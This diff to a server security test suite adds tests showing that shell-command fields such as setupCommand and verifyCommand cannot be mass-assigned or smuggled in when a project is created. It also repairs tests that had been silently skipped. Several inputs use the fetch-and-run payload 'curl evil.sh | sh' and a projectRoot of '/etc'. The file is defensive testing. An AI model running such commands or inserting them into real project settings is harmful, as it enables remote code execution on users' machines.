@@ -8,7 +8,7 @@
  */
 import { describe, it, expect, beforeAll, afterAll, vi } from 'vitest';
 import request from 'supertest';
-import { app, initStorage, isAllowedOrigin, setReleasesUpdateExecImpl, resetReleasesUpdateExecImpl } from '../server';
+import { app, initStorage, isAllowedOrigin, setReleasesUpdateExecImpl, resetReleasesUpdateExecImpl, VERIFY_TOKEN } from '../server';
 import * as fs from 'fs';
 import * as os from 'os';
 import * as path from 'path';
@@ -41,10 +41,20 @@ fs.mkdirSync(path.join(sandboxHome, '.agenfk'), { recursive: true });
 vi.mocked(os.homedir).mockReturnValue(sandboxHome);
 
 const TEST_DB = path.resolve('./security-hardening-test-db.sqlite');
-const VERIFY_TOKEN = (() => {
-  try { return fs.readFileSync(path.join(os.homedir(), '.agenfk', 'verify-token'), 'utf8').trim(); }
-  catch { return ''; }
-})();
+
+/*
+ * THE TOKEN COMES FROM THE SERVER, not from a second read of the same file.
+ *
+ * It used to be re-derived here by reading `~/.agenfk/verify-token` under the
+ * mocked homedir - a sandbox directory this file creates EMPTY. So the read
+ * always threw, the constant was always '', and the two tests that exercise
+ * the token-gated endpoints were guarded by `if (!VERIFY_TOKEN) return`. They
+ * never ran, on any machine, and reported green.
+ *
+ * Two silently-skipped tests, in the file whose job is to guard an RCE. The
+ * server exports the value it actually compares against; using it is the only
+ * way the assertion can be about the real check.
+ */
 
 beforeAll(async () => {
   process.env.AGENFK_DB_PATH = TEST_DB;
@@ -83,19 +93,58 @@ describe('bug 55229bae: CORS origin allowlist (no wildcard)', () => {
 
 // ── bug e60e20aa: mass-assignment on PUT /projects/:id ────────────────────────
 describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
-  it('ignores verifyCommand / projectRoot / flowId on the open route', async () => {
+  it('ignores verifyCommand / setupCommand / projectRoot / flowId on the open route', async () => {
     const project = (await agent().post('/projects').send({ name: 'MassAssign' })).body;
     const res = await agent().put(`/projects/${project.id}`).send({
       name: 'Renamed',
       verifyCommand: 'curl evil.sh | sh',
+      // setupCommand is the newest field of this class and the one most likely
+      // to be filed under preferences, because it reads like configuration. It
+      // is a shell string this machine runs in a directory it just created.
+      setupCommand: 'curl evil.sh | sh',
       projectRoot: '/etc',
       flowId: 'attacker-flow',
     });
     expect(res.status).toBe(200);
     expect(res.body.name).toBe('Renamed');
     expect(res.body.verifyCommand).toBeUndefined();
+    expect(res.body.setupCommand, 'a shell string was set by an unauthenticated caller').toBeUndefined();
     expect(res.body.projectRoot).toBeUndefined();
     expect(res.body.flowId).toBeUndefined();
+  });
+
+  it('setup-command endpoint requires the internal token', async () => {
+    const project = (await agent().post('/projects').send({ name: 'SC' })).body;
+    const unauth = await agent().put(`/projects/${project.id}/setup-command`).send({ setupCommand: 'npm ci' });
+    expect(unauth.status).toBe(401);
+  });
+
+  it('setup-command endpoint sets the command with the internal token', async () => {
+    const project = (await agent().post('/projects').send({ name: 'SC2' })).body;
+    const ok = await agent()
+      .put(`/projects/${project.id}/setup-command`)
+      .set('x-agenfk-internal', VERIFY_TOKEN)
+      .send({ setupCommand: 'npm ci' });
+    expect(ok.status).toBe(200);
+    expect(ok.body.setupCommand).toBe('npm ci');
+  });
+
+  it('cannot be smuggled in at CREATE time, where there is no allowlist to dodge', async () => {
+    /*
+     * The update route is allowlisted; creation builds the Project literal
+     * field by field, which is a different mechanism and therefore worth its
+     * own assertion. An allowlist on one and not the other is the shape this
+     * bug class keeps taking.
+     */
+    const created = (await agent().post('/projects').send({
+      name: 'Smuggle',
+      setupCommand: 'curl evil.sh | sh',
+      verifyCommand: 'curl evil.sh | sh',
+      projectRoot: '/etc',
+    })).body;
+    expect(created.setupCommand).toBeUndefined();
+    expect(created.verifyCommand).toBeUndefined();
+    expect(created.projectRoot).toBeUndefined();
   });
   it('rejects a body with no allowlisted fields', async () => {
     const project = (await agent().post('/projects').send({ name: 'NoFields' })).body;
@@ -108,7 +157,10 @@ describe('bug e60e20aa: PUT /projects/:id is not mass-assignable', () => {
     expect(unauth.status).toBe(401);
   });
   it('verify-command endpoint sets the command with the internal token', async () => {
-    if (!VERIFY_TOKEN) return; // token only present on installed machines
+    // No `if (!VERIFY_TOKEN) return` guard: server.ts falls back to a random
+    // ephemeral token, so it is always a non-empty string. The guard was dead,
+    // and a silently-skipping test inside the file that guards an RCE bug is
+    // the worst place to keep one.
     const project = (await agent().post('/projects').send({ name: 'VC2' })).body;
     const ok = await agent()
       .put(`/projects/${project.id}/verify-command`)
